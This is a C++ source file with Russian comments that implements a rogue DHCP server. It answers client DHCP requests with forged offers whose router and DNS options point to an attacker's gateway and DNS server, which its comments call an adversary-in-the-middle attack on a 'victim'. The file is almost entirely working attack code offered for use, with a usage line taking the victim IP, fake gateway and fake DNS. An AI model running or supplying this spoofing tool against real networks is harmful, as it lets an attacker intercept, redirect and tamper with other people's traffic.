#include <iostream>
#include <cstring>
#include <cstdlib>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <linux/if_ether.h>
#include <linux/udp.h>
#include <linux/ip.h>

#define DHCP_SERVER_PORT 67
#define DHCP_CLIENT_PORT 68
#define BUFFER_SIZE 1024

using namespace std;

struct dhcp_packet {
    uint8_t op;          // 1 = Request, 2 = Reply
    uint8_t htype;       // Тип аппаратного адреса (Ethernet = 1)
    uint8_t hlen;        // Длина MAC-адреса
    uint8_t hops;        // Количество хопов
    uint32_t xid;        // ID транзакции
    uint16_t secs;       // Время с момента запроса
    uint16_t flags;      // Флаги
    uint32_t ciaddr;     // Клиентский IP (0.0.0.0, если новый клиент)
    uint32_t yiaddr;     // Назначаемый IP-адрес клиенту
    uint32_t siaddr;     // IP DHCP-сервера
    uint32_t giaddr;     // Шлюз
    uint8_t chaddr[16];  // MAC-адрес клиента
    uint8_t sname[64];   // Имя сервера
    uint8_t file[128];   // Файл загрузки (BOOTP)
    uint8_t options[312];// DHCP-опции
};

// Функция отправки поддельного DHCP-ответа
void send_dhcp_offer(int sock, struct sockaddr_in client_addr, struct dhcp_packet *request, const char* fake_ip, const char* fake_gateway, const char* fake_dns) {
    struct dhcp_packet response;
    memset(&response, 0, sizeof(response));

    response.op = 2; // DHCP Offer
    response.htype = 1;
    response.hlen = 6;
    response.xid = request->xid;
    response.yiaddr = inet_addr(fake_ip);     // Поддельный IP жертвы
    response.siaddr = inet_addr(fake_gateway); // Поддельный DHCP-сервер (AiTM)
    memcpy(response.chaddr, request->chaddr, 6);  // Копируем MAC жертвы

    // (subnet mask, router, DNS)
    response.options[0] = 0x63;
    response.options[1] = 0x82;
    response.options[2] = 0x53;
    response.options[3] = 0x63; // Magic cookie
    response.options[4] = 53;    // DHCP Message Type
    response.options[5] = 1;
    response.options[6] = 2;     // DHCP Offer
    response.options[7] = 1;     // Subnet mask
    response.options[8] = 4;
    response.options[9] = 255;
    response.options[10] = 255;
    response.options[11] = 255;
    response.options[12] = 0;
    response.options[13] = 3;    // Router
    response.options[14] = 4;
    *(uint32_t*)&response.options[15] = inet_addr(fake_gateway); // Шлюз
    response.options[19] = 6;    // DNS
    response.options[20] = 4;
    *(uint32_t*)&response.options[21] = inet_addr(fake_dns); // DNS сервер
    response.options[25] = 255;  // Конец опций

    sendto(sock, &response, sizeof(response), 0, (struct sockaddr *)&client_addr, sizeof(client_addr));
    cout << "Fake DHCP-offer sended" << endl;
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        cout << "Usage: " << argv[0] << " <Victim IP> <Gateway> <DNS>\n";
        cout << "Example: " << argv[0] << " 192.168.1.150 192.168.1.1 8.8.8.8\n";
        return 1;
    }

    const char* fake_ip = argv[1];      // Поддельный IP жертвы
    const char* fake_gateway = argv[2]; // Поддельный шлюз (AiTM)
    const char* fake_dns = argv[3];     // Фальшивый DNS-сервер

    int sock;
    struct sockaddr_in server_addr, client_addr;
    socklen_t addr_len = sizeof(client_addr);
    char buffer[BUFFER_SIZE];

    // Создание сокета UDP для прослушивания DHCP-запросов
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation error");
        return 1;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(DHCP_SERVER_PORT);
    server_addr.sin_addr.s_addr = INADDR_ANY;

    // Привязываем сокет к порту 67 (DHCP сервер)
    if (bind(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Socket binding error");
        return 1;
    }

    cout << "Fake DHCP started..." << endl;

    while (true) {
        memset(buffer, 0, BUFFER_SIZE);
        recvfrom(sock, buffer, BUFFER_SIZE, 0, (struct sockaddr *)&client_addr, &addr_len);

        struct dhcp_packet *request = (struct dhcp_packet *)buffer;
        if (request->op == 1) { // DHCP Discover или Request
            cout << "DHCP-request from victim!" << endl;
            send_dhcp_offer(sock, client_addr, request, fake_ip, fake_gateway, fake_dns);
        }
    }

    close(sock);
    return 0;
}
